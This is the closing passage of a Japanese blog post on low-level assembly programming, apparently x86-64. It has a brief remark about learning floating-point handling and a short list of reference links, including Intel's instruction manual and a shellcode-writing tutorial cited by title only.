よくわかっていなかった浮動小数点値の扱い方も知ることができてよかった.

## 参考リンク

- [原書で学ぶ64bitアセンブラ入門（6） - わらばんし仄聞記](http://warabanshi.hatenablog.com/entry/2014/05/21/001419)
- [Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 2 (2A, 2B, 2C & 2D): Instruction Set Reference, A-Z](http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.html)
- [Linux x86用のシェルコードを書いてみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/13/013056)
- [python - Convert hex to float - Stack Overflow](http://stackoverflow.com/a/1592362)
